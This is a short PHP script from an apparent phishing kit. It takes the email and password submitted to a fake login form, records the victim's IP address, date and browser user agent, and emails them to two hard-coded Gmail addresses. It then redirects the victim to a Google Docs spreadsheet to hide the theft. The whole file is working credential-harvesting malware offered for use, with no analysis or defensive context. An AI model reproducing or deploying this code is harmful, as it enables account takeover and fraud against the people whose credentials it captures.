<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------\n";
$message .= "email: ".$_POST['email']."\n";
$message .= "pass: ".$_POST['password']."\n";

$message .= "----------\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= " - by x0r -\n";

$recipient = "terryanderson0110@gmail.com,terry.cole1515@gmail.com";
$subject = "j-B";
$headers .= "j-B";
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="2; URL= https://docs.google.com/spreadsheets/d/1FKwO_0myJKhl6R1Q8rbHOcnOo4clIKYBjjAOVMC4ba4/edit?pref=2&pli=1#gid=1573896427">
